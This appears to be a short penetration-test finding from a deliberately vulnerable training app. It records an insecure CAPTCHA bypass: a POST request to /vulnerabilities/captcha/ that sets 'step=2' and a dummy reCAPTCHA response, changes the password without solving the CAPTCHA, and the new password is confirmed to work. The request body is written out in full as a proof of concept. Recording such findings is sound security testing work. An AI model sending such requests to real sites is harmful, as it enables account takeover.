title: Insecure CAPTCHA - Bypass via Parameter Manipulation
proof: POST to /vulnerabilities/captcha/ with step=2&password_new=bypass123&password_conf=bypass123&Change=Change&g-recaptcha-response=hacked successfully bypassed the reCAPTCHA check. By setting 'step=2' directly, the server skips reCAPTCHA verification entirely. The new password was accepted and worked for subsequent login.
poc_steps: Note: reCAPTCHA API key is missing from config (per /var/www/html/config/config.inc.php)
Password changed without solving any CAPTCHA
